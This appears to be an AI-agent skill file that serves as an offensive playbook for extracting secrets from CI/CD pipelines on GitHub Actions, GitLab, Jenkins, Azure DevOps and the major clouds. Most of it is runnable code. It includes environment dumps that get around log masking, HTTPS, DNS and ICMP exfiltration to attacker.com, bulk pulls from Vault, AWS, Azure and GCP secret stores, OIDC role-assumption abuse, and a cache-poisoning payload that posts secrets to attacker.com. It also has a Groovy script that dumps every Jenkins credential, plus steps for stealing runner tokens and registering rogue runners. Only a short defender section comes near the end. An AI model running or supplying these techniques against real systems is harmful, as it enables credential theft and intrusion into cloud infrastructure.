---
name: offensive-cicd-secrets
description: "Comprehensive secrets extraction methodology targeting CI/CD environments across all major platforms. Covers environment variable extraction from build contexts, exploitation of vault and secrets-manager misconfigurations (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault, GCP Secret Manager), runner and agent token abuse for lateral movement, OIDC federation attacks exploiting trust relationships between CI/CD providers and cloud platforms, build log leakage analysis for inadvertently exposed credentials, cache poisoning techniques for credential exfiltration, platform-specific credential store exploitation (GitHub Actions secrets, GitLab CI variables, Jenkins credential providers), service connection and service account abuse in Azure DevOps and GCP, and Docker registry credential theft from build environments. Maps to MITRE ATT&CK T1552 (Unsecured Credentials) and its sub-techniques. Each section provides enumeration procedures, extraction techniques, and post-exploitation pivoting guidance for using recovered secrets to expand access."
---

# Offensive CI/CD Secrets Extraction

Secrets in CI/CD environments are the primary objective for pipeline compromise. Every pipeline
holds credentials -- deployment keys, cloud provider tokens, API secrets, registry passwords,
database connection strings -- and the mechanisms protecting them are consistently weaker than
those guarding production secrets. You exploit the fundamental tension in CI/CD design: pipelines
need credentials to deploy, but the environments executing pipelines are transient, shared, and
often accessible to anyone who can open a pull request.

This skill systematically covers every extraction path across CI/CD platforms, from trivial
environment variable dumps to sophisticated OIDC federation abuse. You enumerate what secrets
exist, determine which extraction technique applies, recover the credentials, and pivot to
expand your access.

MITRE ATT&CK: T1552 (Unsecured Credentials), T1552.001 (Credentials In Files), T1552.004
(Private Keys), T1552.007 (Container API)

## Quick Workflow

1. Gain code execution in a CI/CD pipeline (see offensive-cicd-pipeline skill for injection vectors).
2. Enumerate the execution environment -- platform, runner type, available tools, network access.
3. Dump all environment variables and filter for secrets patterns.
4. Query platform-specific credential stores using available tokens (GITHUB_TOKEN, CI_JOB_TOKEN, PAT).
5. Check for vault/secrets-manager integrations and test for misconfigurations.
6. Examine build logs, caches, and artifacts for leaked credentials.
7. Test OIDC federation trust if cloud provider integration is present.
8. Validate recovered credentials and determine their scope.
9. Pivot using recovered secrets to access additional systems, registries, and cloud resources.

---

## Environment Variable Extraction

Every CI/CD platform injects secrets as environment variables. Your first action in any compromised
pipeline is a comprehensive environment dump. Platforms attempt to mask secret values in logs, but
the masking is trivially bypassed.

### Direct Extraction

```bash
# Full environment dump -- works on all platforms
env | sort

# Base64 encode to bypass log masking
env | base64

# Reverse the string to defeat pattern-matching masks
env | rev

# Character-by-character extraction defeats even advanced masking
for var in $(env | grep -i -E 'key|secret|token|pass|cred|auth' | cut -d= -f1); do
    value=$(printenv "$var")
    echo -n "$var="
    echo "$value" | fold -w1 | paste -sd' '
done

# Hex encoding for binary-safe exfiltration
env | xxd -p | tr -d '\n'
```

### Targeted Pattern Matching

```bash
# Extract high-value variables by naming convention
env | grep -iE '^(AWS_|AZURE_|GCP_|GOOGLE_|GITHUB_|GITLAB_|DOCKER_|NPM_|ARTIFACTORY_|VAULT_|DATABASE_|DB_|REDIS_|MONGO_|POSTGRES_|MYSQL_|SSH_|PRIVATE_|API_KEY|SECRET|TOKEN|PASSWORD|CREDENTIAL|AUTH)' | sort

# Search for variables containing credential-shaped values
env | grep -E '=[A-Za-z0-9+/]{20,}={0,2}$'    # Base64-encoded values
env | grep -E '=ghp_[A-Za-z0-9]{36}'            # GitHub personal access tokens
env | grep -E '=ghs_[A-Za-z0-9]{36}'            # GitHub installation tokens
env | grep -E '=glpat-[A-Za-z0-9\-]{20}'        # GitLab personal access tokens
env | grep -E '=AKIA[A-Z0-9]{16}'               # AWS access key IDs
env | grep -E '=sk-[A-Za-z0-9]{20,}'            # Stripe/OpenAI-style keys

# Find secrets in process memory (if /proc is available)
strings /proc/self/environ 2>/dev/null
strings /proc/*/environ 2>/dev/null | sort -u | grep -iE 'secret|token|key|pass'
```

### Exfiltration Channels

```bash
# HTTPS POST exfiltration (most reliable)
env | base64 | curl -sS -X POST -d @- https://attacker.com/collect

# DNS exfiltration for restricted networks
for secret in $(env | grep -i SECRET | base64 | fold -w 60); do
    nslookup "${secret}.exfil.attacker.com" 2>/dev/null
done

# ICMP exfiltration when HTTP is blocked
env | xxd -p | fold -w 32 | while read chunk; do
    ping -c 1 -p "$chunk" attacker.com 2>/dev/null
done

# Write to pipeline artifact for later retrieval
env | base64 > /tmp/build-metrics.dat
# Then upload as artifact through the platform's mechanism
```

---

## Vault and Secrets Manager Misconfigurations

CI/CD pipelines frequently integrate with secrets managers. You exploit misconfigurations in how
pipelines authenticate to and retrieve secrets from these systems.

### HashiCorp Vault

```bash
# Check if Vault environment is configured
echo "VAULT_ADDR: $VAULT_ADDR"
echo "VAULT_TOKEN: $VAULT_TOKEN"
echo "VAULT_ROLE_ID: $VAULT_ROLE_ID"
echo "VAULT_SECRET_ID: $VAULT_SECRET_ID"

# If VAULT_TOKEN is present, enumerate accessible secrets
vault secrets list 2>/dev/null || \
  curl -sS -H "X-Vault-Token: $VAULT_TOKEN" "$VAULT_ADDR/v1/sys/mounts" | jq '.data | keys'

# List and read KV secrets
vault kv list secret/ 2>/dev/null || \
  curl -sS -H "X-Vault-Token: $VAULT_TOKEN" "$VAULT_ADDR/v1/secret/metadata?list=true" | jq '.'

# Attempt to read common secret paths
for path in secret/data/production secret/data/deploy secret/data/database secret/data/aws; do
    echo "--- $path ---"
    curl -sS -H "X-Vault-Token: $VAULT_TOKEN" "$VAULT_ADDR/v1/$path" 2>/dev/null | jq '.data'
done

# If AppRole credentials are available, authenticate
curl -sS -X POST "$VAULT_ADDR/v1/auth/approle/login" \
  -d "{\"role_id\": \"$VAULT_ROLE_ID\", \"secret_id\": \"$VAULT_SECRET_ID\"}" | jq '.'

# Check token capabilities -- often over-permissioned for CI
curl -sS -X POST -H "X-Vault-Token: $VAULT_TOKEN" \
  "$VAULT_ADDR/v1/sys/capabilities-self" \
  -d '{"paths": ["secret/*", "aws/*", "database/*", "ssh/*"]}' | jq '.'
```

### AWS Secrets Manager and Parameter Store

```bash
# Check for AWS credentials in the environment
echo "AWS_ACCESS_KEY_ID: $AWS_ACCESS_KEY_ID"
echo "AWS_SECRET_ACCESS_KEY: ${AWS_SECRET_ACCESS_KEY:0:8}..."
echo "AWS_SESSION_TOKEN present: $([ -n "$AWS_SESSION_TOKEN" ] && echo yes || echo no)"

# Check if running on EC2 with instance metadata
curl -sS -m 2 http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null

# List all secrets in Secrets Manager
aws secretsmanager list-secrets --query 'SecretList[].{Name:Name,ARN:ARN}' --output table

# Extract secret values
aws secretsmanager list-secrets --query 'SecretList[].Name' --output text | tr '\t' '\n' | \
  while read name; do
    echo "=== $name ==="
    aws secretsmanager get-secret-value --secret-id "$name" --query 'SecretString' --output text 2>/dev/null
  done

# SSM Parameter Store -- often contains credentials with weak IAM boundaries
aws ssm describe-parameters --query 'Parameters[].{Name:Name,Type:Type}' --output table
aws ssm get-parameters-by-path --path "/" --recursive --with-decryption \
  --query 'Parameters[].{Name:Name,Value:Value}' --output table 2>/dev/null
```

### Azure Key Vault

```bash
# Check for Azure managed identity
curl -sS -m 2 -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  2>/dev/null | jq '.access_token'

# List Key Vaults accessible to the current identity
az keyvault list --query '[].{name:name, uri:properties.vaultUri}' --output table

# Extract all secrets from a vault
VAULT_NAME="target-vault"
az keyvault secret list --vault-name "$VAULT_NAME" --query '[].{name:name, id:id}' --output table
az keyvault secret list --vault-name "$VAULT_NAME" --query '[].name' --output tsv | \
  while read name; do
    echo "=== $name ==="
    az keyvault secret show --vault-name "$VAULT_NAME" --name "$name" --query 'value' --output tsv
  done

# Extract certificates and keys
az keyvault certificate list --vault-name "$VAULT_NAME" --output table
az keyvault key list --vault-name "$VAULT_NAME" --output table
```

### GCP Secret Manager

```bash
# Check for GCP credentials
echo "GOOGLE_APPLICATION_CREDENTIALS: $GOOGLE_APPLICATION_CREDENTIALS"
cat "$GOOGLE_APPLICATION_CREDENTIALS" 2>/dev/null | jq '.client_email, .project_id'

# Use metadata server for default credentials
curl -sS -H "Metadata-Flavor: Google" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq '.'

# List all secrets in the project
gcloud secrets list --format='table(name, replication.automatic)'

# Extract secret values
gcloud secrets list --format='value(name)' | while read name; do
    echo "=== $name ==="
    gcloud secrets versions access latest --secret="$name" 2>/dev/null
done
```

---

## OIDC Federation Attacks

OIDC federation allows CI/CD pipelines to authenticate to cloud providers without storing long-lived
credentials. You exploit trust misconfigurations in the federation setup to assume roles from
unauthorized contexts.

### GitHub Actions OIDC

```yaml
# GitHub Actions requests an OIDC token from the GitHub token endpoint
# The token contains claims about the workflow context
steps:
  - name: Extract OIDC token and examine claims
    run: |
      # Request the OIDC token
      OIDC_TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
        "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')

      # Decode and examine the claims (header.payload.signature)
      echo "$OIDC_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

      # The claims include:
      # sub: repo:org/repo:ref:refs/heads/main
      # repository: org/repo
      # ref: refs/heads/main
      # If the AWS role trust policy is overly permissive (e.g., trusts any ref
      # or any repo in the org), you can assume it from a fork or feature branch
```

Attack scenario -- overly broad trust policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"},
    "Action": "sts:AssumeRoleWithWebIdentity",
    "Condition": {
      "StringLike": {
        "token.actions.githubusercontent.com:sub": "repo:target-org/*"
      }
    }
  }]
}
```

```bash
# This trust policy accepts ANY repository in the org
# If you can create a repo in the org or find any repo with Actions write access,
# you can assume this role

# From your controlled workflow in any org repo:
aws sts assume-role-with-web-identity \
  --role-arn "arn:aws:iam::ACCOUNT:role/deploy-role" \
  --role-session-name "exploit" \
  --web-identity-token "$OIDC_TOKEN"
```

### GitLab CI OIDC

```yaml
# GitLab CI can also issue OIDC tokens
extract_oidc:
  script:
    - |
      # GitLab injects CI_JOB_JWT and CI_JOB_JWT_V2
      echo "$CI_JOB_JWT_V2" | cut -d. -f2 | base64 -d 2>/dev/null | jq '.'

      # Claims include namespace_path, project_path, ref, ref_protected
      # Misconfigured trust policies may not validate ref_protected or project_path

      # Assume AWS role using GitLab OIDC token
      aws sts assume-role-with-web-identity \
        --role-arn "arn:aws:iam::ACCOUNT:role/gitlab-deploy" \
        --role-session-name "gitlab-exploit" \
        --web-identity-token "$CI_JOB_JWT_V2"
  id_tokens:
    CUSTOM_TOKEN:
      aud: https://aws.amazon.com
```

---

## Build Log and Cache Exploitation

Build logs and caches frequently contain credentials leaked through careless scripting, verbose
output modes, or debug configurations.

### Log Analysis

```bash
# GitHub Actions: Retrieve workflow run logs via API
# Requires a token with actions:read scope
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/OWNER/REPO/actions/runs" | \
  jq '.workflow_runs[:10] | .[].id' | while read run_id; do
    curl -sS -L -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/repos/OWNER/REPO/actions/runs/$run_id/logs" \
      -o "run_${run_id}.zip"
    unzip -o "run_${run_id}.zip" -d "logs_${run_id}" 2>/dev/null
done

# Search extracted logs for leaked secrets
grep -rihE '(password|secret|token|key|credential)[\s]*[=:][\s]*\S+' logs_*/ 2>/dev/null
grep -rihE '(AKIA[A-Z0-9]{16}|ghp_[A-Za-z0-9]{36}|sk-[A-Za-z0-9]{20,})' logs_*/ 2>/dev/null
grep -rihE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+' logs_*/ 2>/dev/null  # JWT tokens

# Jenkins: Build console output often contains unmasked secrets
curl -sS -u "user:$JENKINS_TOKEN" \
  "https://jenkins.target.com/job/JOB_NAME/lastBuild/consoleText" | \
  grep -iE 'password|secret|token|key'
```

### Cache Poisoning for Exfiltration

```yaml
# GitHub Actions: Poison the build cache to exfiltrate secrets on next run
# First run: inject exfiltration script into cached dependencies
steps:
  - uses: actions/cache@v4
    with:
      path: ~/.npm
      key: npm-cache-${{ hashFiles('package-lock.json') }}

  - run: |
      # Inject into a cached module that executes during install
      mkdir -p ~/.npm/_preinstall
      cat > ~/.npm/_preinstall/exfil.sh << 'PAYLOAD'
      #!/bin/bash
      env | base64 | curl -sS -X POST -d @- https://attacker.com/cache-exfil &
      PAYLOAD
      chmod +x ~/.npm/_preinstall/exfil.sh
      # Modify a cached package's install script to trigger it
```

GitLab CI shared caches work similarly -- inject a payload into `node_modules/` with `cache: policy: push`, and the deploy job pulling the same cache key executes it.

---

## Platform-Specific Credential Stores

Each CI/CD platform has its own credential storage mechanism with distinct extraction techniques.

### GitHub Actions Secrets

```bash
# GitHub Actions secrets are injected as environment variables
# They are masked in logs but accessible programmatically

# List all secrets available to the workflow (names only, via API)
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets" | jq '.secrets[].name'

# Organization-level secrets
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/orgs/$ORG/actions/secrets" | jq '.secrets[].name'

# Repository environment secrets
curl -sS -H "Authorization: token $GITHUB_TOKEN" \
  "https://api.github.com/repos/$GITHUB_REPOSITORY/environments" | \
  jq '.environments[].name' | while read env_name; do
    echo "=== Environment: $env_name ==="
    curl -sS -H "Authorization: token $GITHUB_TOKEN" \
      "https://api.github.com/repos/$GITHUB_REPOSITORY/environments/${env_name}/secrets" | jq '.'
done

# Values require code execution in the pipeline context -- use env dump techniques above
```

### Jenkins Credential Store

```groovy
// Groovy script to extract all Jenkins credentials
import com.cloudbees.plugins.credentials.CredentialsProvider
import com.cloudbees.plugins.credentials.Credentials
import com.cloudbees.plugins.credentials.domains.Domain
import jenkins.model.Jenkins

def store = Jenkins.instance.getExtensionList(
    'com.cloudbees.plugins.credentials.SystemCredentialsProvider'
)[0].getStore()

store.getDomains().each { domain ->
    store.getCredentials(domain).each { cred ->
        println "=== ${cred.id} (${cred.class.simpleName}) ==="
        if (cred.respondsTo('getUsername')) println "Username: ${cred.username}"
        if (cred.respondsTo('getPassword')) println "Password: ${cred.password}"
        if (cred.respondsTo('getSecret')) println "Secret: ${cred.secret}"
        if (cred.respondsTo('getPrivateKey')) println "Private Key: ${cred.privateKey}"
        if (cred.respondsTo('getToken')) println "Token: ${cred.token}"
        println "---"
    }
}
```

For offline decryption of `credentials.xml`, you need `secrets/master.key` and `secrets/hudson.util.Secret` from the Jenkins home directory. Hash the master key with SHA-256, use the first 16 bytes to AES-ECB-decrypt the hudson secret, then use that as the AES-128-CBC key (IV is bytes 1-17 of the encrypted blob) to decrypt individual credential entries.

### GitLab CI Variables

```bash
# Extract variables using CI_JOB_TOKEN (limited scope)
curl -sS --header "JOB-TOKEN: $CI_JOB_TOKEN" \
  "https://gitlab.target.com/api/v4/projects/$CI_PROJECT_ID/variables" | jq '.'

# With a personal access token or impersonation token (broader scope)
curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.target.com/api/v4/projects/$CI_PROJECT_ID/variables" | \
  jq '.[] | {key, value, protected, masked, environment_scope}'

# Group variables (inherited by all projects in the group)
curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.target.com/api/v4/groups/$GROUP_ID/variables" | \
  jq '.[] | {key, value, protected}'

# Instance variables (requires admin access)
curl -sS --header "PRIVATE-TOKEN: $GITLAB_TOKEN" \
  "https://gitlab.target.com/api/v4/admin/ci/variables" | jq '.'

# File-type variables are written to disk -- find them
find /builds -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.json" 2>/dev/null | \
  while read f; do echo "=== $f ==="; cat "$f"; done
```

---

## Docker Registry Credential Theft

CI/CD pipelines that build and push container images store Docker registry credentials. You extract
them from the runner filesystem, environment variables, or the Docker credential helper chain.

```bash
# Check Docker configuration for stored credentials
cat ~/.docker/config.json 2>/dev/null | jq '.'
# Look for credHelpers, credStore, and direct auths entries

# Extract from Docker credential helpers
docker-credential-gcr list 2>/dev/null
docker-credential-ecr-login list 2>/dev/null
docker-credential-desktop list 2>/dev/null

# For each credential helper, get the stored credentials
for helper in gcr ecr-login desktop secretservice pass; do
    echo "=== docker-credential-$helper ==="
    echo "" | docker-credential-$helper list 2>/dev/null | \
      jq -r 'keys[]' 2>/dev/null | while read registry; do
        echo "$registry" | docker-credential-$helper get 2>/dev/null | jq '.'
    done
done

# Check for registry tokens in environment
env | grep -iE '(DOCKER_|REGISTRY_|CR_|ACR_|ECR_|GCR_|GHCR_)' | sort

# GitHub Container Registry token -- GITHUB_TOKEN often has packages:write
echo "$GITHUB_TOKEN" | docker login ghcr.io -u USERNAME --password-stdin

# AWS ECR -- extract temporary credentials
aws ecr get-login-password --region us-east-1

# GCP Artifact Registry
gcloud auth print-access-token
```

---

## Service Connections and Runner Tokens

Cloud service connections and runner tokens provide direct pivot paths from CI/CD into infrastructure.

```bash
# Azure DevOps service connections -- credentials injected as env vars
echo "ARM_CLIENT_ID: $ARM_CLIENT_ID"
echo "ARM_CLIENT_SECRET: ${ARM_CLIENT_SECRET:0:8}..."
az login --service-principal -u "$ARM_CLIENT_ID" -p "$ARM_CLIENT_SECRET" -t "$ARM_TENANT_ID"
az role assignment list --assignee "$ARM_CLIENT_ID" --output table

# GCP service account keys on runners
find / -name "*.json" -exec grep -l "private_key_id" {} \; 2>/dev/null
gcloud auth print-access-token --impersonate-service-account=TARGET@PROJECT.iam.gserviceaccount.com

# AWS cross-account role assumption
aws sts get-caller-identity
```

Runner tokens enable job interception and rogue runner registration:

```bash
# GitHub Actions self-hosted runner credentials
cat /home/runner/.runner 2>/dev/null | jq '.'
cat /home/runner/.credentials 2>/dev/null
find / -path "*actions-runner*" -name ".runner" 2>/dev/null

# GitLab runner token extraction
grep -E '(token|url)' /etc/gitlab-runner/config.toml 2>/dev/null

# Claim jobs with a stolen GitLab runner token
curl -sS --request POST "https://gitlab.target.com/api/v4/jobs/request" \
  --form "token=RUNNER_TOKEN" --form "info[name]=rogue-runner"

# Jenkins agent secret files
find / -name "secret.key" -path "*/jenkins/*" 2>/dev/null
```

---

## Detection / Defender View

Defenders should implement these controls and monitor for these indicators:

- **Environment variable access patterns**: Alert when pipeline steps execute `env`, `printenv`, or access `/proc/self/environ` outside expected debugging contexts.
- **Outbound data exfiltration**: Monitor runner network traffic for POST requests to unknown hosts and unusual DNS query patterns.
- **Secrets access auditing**: Enable vault/secrets-manager access logs. Alert on bulk secret enumeration or access from unexpected IP ranges.
- **OIDC token claims validation**: Ensure cloud provider trust policies validate specific claims (repository, branch, environment) rather than broad organization-level trust.
- **Log sanitization**: Scan build logs for credential patterns before storage using truffleHog or detect-secrets.
- **Cache integrity**: Implement cache signing or checksums to detect poisoning.
- **Runner filesystem hygiene**: Use ephemeral runners. Scrub filesystem between jobs on persistent runners.
- **Token rotation**: Rotate runner registration tokens regularly. Monitor for unexpected runner registrations.
- **Credential scope minimization**: Apply least-privilege to all CI/CD credentials. Use short-lived tokens. Separate read and write credentials.

Key defensive controls: use OIDC with narrow claim constraints over long-lived credentials; enable audit logging on all secrets platforms; use ephemeral container-based runners; restrict secret access via environment protection rules; implement network segmentation for build environments.

---

## Engagement Cheatsheet

| Vector                        | Platform          | Access Required        | Impact                  |
|-------------------------------|-------------------|------------------------|-------------------------|
| Env var dump                  | All               | Pipeline execution     | All injected secrets    |
| Log masking bypass            | All               | Pipeline execution     | Secret values in logs   |
| Vault token reuse             | All + Vault       | Pipeline execution     | Vault secret access     |
| AWS metadata/creds            | AWS runners       | Pipeline execution     | AWS account access      |
| Azure managed identity        | Azure runners     | Pipeline execution     | Azure subscription      |
| GCP metadata/SA key           | GCP runners       | Pipeline execution     | GCP project access      |
| OIDC federation abuse         | GitHub/GitLab     | Workflow in trusted org| Cloud role assumption   |
| Build log analysis            | All               | Log read access        | Leaked credentials      |
| Cache poisoning               | GitHub/GitLab     | Cache write access     | Credential exfiltration |
| Jenkins credential dump       | Jenkins           | Script console access  | All stored credentials  |
| GitLab variable extraction    | GitLab            | API token              | Project/group secrets   |
| Docker config theft           | All               | Runner filesystem      | Registry credentials    |
| Runner token capture          | GitHub/GitLab     | Runner filesystem      | Job interception        |
| Service connection theft      | Azure DevOps      | Pipeline execution     | Cloud infra access      |
| SSM Parameter Store           | AWS               | Pipeline execution     | Stored parameters       |
| Key Vault extraction          | Azure             | Pipeline execution     | Vault secrets/keys      |

---

## Key References

- MITRE ATT&CK T1552: https://attack.mitre.org/techniques/T1552/
- OWASP Top 10 CI/CD Risks (CICD-SEC-6): https://owasp.org/www-project-top-10-ci-cd-security-risks/
- GitHub Actions Secrets Hardening: https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions
- GitLab CI/CD Variable Security: https://docs.gitlab.com/ee/ci/variables/#cicd-variable-security
- Jenkins Credentials Plugin: https://plugins.jenkins.io/credentials/
- HashiCorp Vault CI/CD Integration: https://developer.hashicorp.com/vault/tutorials/app-integration
- AWS OIDC with GitHub Actions: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_create_oidc.html
- truffleHog: https://github.com/trufflesecurity/trufflehog
- detect-secrets: https://github.com/Yelp/detect-secrets
